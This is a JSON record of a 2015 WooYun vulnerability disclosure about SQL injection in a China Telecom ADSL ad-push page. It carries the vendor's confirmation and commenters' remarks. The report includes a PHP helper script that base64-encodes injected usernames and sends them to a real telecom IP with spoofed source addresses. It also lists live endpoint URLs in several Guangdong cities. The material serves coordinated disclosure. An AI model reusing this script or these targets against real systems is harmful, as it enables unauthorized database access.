{"id": 46354, "wybug_id": "wooyun-2015-091213", "wybug_title": "中国电信ADSL某广告推送系统SQL注入", "wybug_corp": "中国电信", "wybug_author": "DoSo", "wybug_date": "2015-01-12 18:10", "wybug_open_date": "2015-02-26 18:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "14", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-26：\t细节向公众公开  简要描述：   中国电信ADSL某广告推送系统SQL注入  第一次发不知道怎样才能掩饰自己是菜鸟的事实，所以赏个邀请码呗  顺便严重鄙视一下中国电信ADSL无良地强制推送广告的恶心行为，单纯吐槽，不要查我水表  详细说明：  在平时打开网页就经常弹出，这种硬性广告\n\n网址：http://121.32.136.50:701/gz_20141028/guangzhou/20141028/BadwebRemindPage.aspx?param=ABdXNlck5hbWU9MDIweHh4eHh4QDE2My5nZCZzcmNVcmw9d3d3LmJhaWR1LmNvbSZwb2xpY3lJZD0xMzc1JnNyY0lwPTEyNy4wLjAuMSZ0eXBlPTA=已经忍无可忍了，必须挖一下尝试对param的值进行base64解码，是乱码在js里看到这样的代码\nvar paraStr = params.substring(9);\t\tvar paraArr = decode64(paraStr).split('&');\t\tfor(var i=0;i<paraArr.length;i++)\t\t{\t\t\tvar strArr = paraArr[i].split('=');\t\t\tif(strArr[0] == \"type\")\t\t\t{\t\t\t\ttype = strArr[1];\t\t\t}\t\t\tif(strArr[0] == \"srcUrl\")\t\t\t{\t\t\t\tsourceUrl = strArr[1];\t\t\t}\t\t}\n把?param=AB这9个字符去掉即可base64解出原文userName=020xxxx@163.gd&srcUrl=www.baidu.com&policyId=1375&srcIp=127.0.0.1&type=0经过测试在thirdconfirm.aspx的userName处有注入点为了方便注入，搞了一小段代码\n<?phperror_reporting(1);?><!DOCTYPE html><html>\t<head>\t<title>电信注个入</title>\t<meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\">\t</head>\t<body>    \t<br />\t\t<form action=\"\" method=\"get\">\t\t\t<input type=\"text\" name=\"userName\" style=\"width:700px\" value=\"<?=$_GET['userName']?>\" />\t\t\t<input type=\"submit\" value=\"干\" />\t\t</form><?phpfunction randip(){\t$iplongstart = ip2long('36.18.192.0');\t$iplongend = ip2long('36.18.255.255');\t$ip = long2ip(mt_rand($iplongstart, $iplongend));\treturn $ip;}function getCon($str,$x,$y='',$nt=FALSE,$w=FALSE){\t\t$tem=strstr($str,$x);\tif($y==''){\t\t$l=strlen($tem);\t}\telse{\t\t$l=strpos($tem,$y,strlen($x));\t}\t$hl=0;\tif($nt){\t\t$hl=strlen($x);\t\t$l=$l-$hl;\t}\t$wl=0;\tif($w){\t\t$wl=strlen($y);\t}\treturn substr($tem,$hl, $l+$wl);}function main(){\t$username = trim($_GET['userName']);\tif(empty($username)){\t\techo '<p>post empty</p>';\t\treturn '';\t}\t$mystr = 'userName='.$username.'&srcUrl=www.baidu.com&policyId=1375&srcIp='.randip().'&type=0';\t$mystr = base64_encode($mystr);\t$url = 'http://121.32.136.50:701/gz_20141028/guangzhou/20141028/thirdconfirm.aspx?param=AB'.$mystr;\t// echo $url;\t// $html = file_get_contents($url);\t$myc = curl_init();\t$headers = array(     'User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:28.0) Gecko/20100101 Firefox/28.0',     'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',     'Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3',     'Connection:   Keep-Alive ',\t   'DNT: 1',\t );   curl_setopt($myc, CURLOPT_HEADER, false);  curl_setopt($myc, CURLOPT_HTTPHEADER,$headers);  curl_setopt($myc, CURLOPT_URL,$url);  curl_setopt($myc, CURLOPT_RETURNTRANSFER,true);  curl_setopt($myc, CURLOPT_TIMEOUT, 10);  $html = curl_exec($myc);  curl_close($myc);\tif(empty($html)){\t\techo '<p>contents empty</p>';\t\treturn '';\t}\t$html = getCon($html, 'UserBirthday\">', '</span>', true);\techo $html;}main();?>\t</body></html>\n经测试，发现是Oracle数据库\n\n\n\n本人小菜就不深入了在搜索引擎搜索了一下，基本都是广东地区的广州http://121.32.136.50:701/gz_20141028/guangzhou/20141028/BadwebRemindPage.aspx?param=ABxxx云浮http://121.10.28.148:701/yf_20131119/yunfu/20131120/BadwebRemindPage.aspx?param=ABxxx江门http://202.105.168.34:701/jm_20140113/jiangmen/20140113/BadwebRemindPage.aspx?param=ABxxx湛江http://121.10.130.25:701/zj_2014722/zhanjiang/2014722/BadwebRemindPage.aspx?param=ABxxx惠州http://121.15.223.80:701/hz_20120712/huizhou/20120712/BadwebRemind/BadwebRemindPage.aspx?param=ABxxx   漏洞证明：  \n\n\n\n   修复方案：     过滤啊   版权声明：转载请注明来源 DoSo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-16 16:13 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向中国电信集团公司通报，由其后续协调各省网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-12 18:11 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这个就是浏览器右下角弹的广告吧，劫持？    \n     2015-01-12 20:21 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @浩天 哥也中标啊    \n     2015-01-13 08:22 |    \t\tMradxz \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:5        | 我是菜鸟我是菜鸟)\t\t \n  尼玛的推送个cookie杂样    \n     2015-01-13 11:41 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  电信这种正规运营商也劫持 - -     \n     2015-01-16 16:17 |    \t\t临时工 \t\t\t( 普通白帽子  |\t\t\t        Rank:122 漏洞数:11        | 初来乍到)\t\t \n  都尼玛说wooyun被劫持弹广告，就你们运营商干的    \n     2015-02-27 08:14 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n    大快人心    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}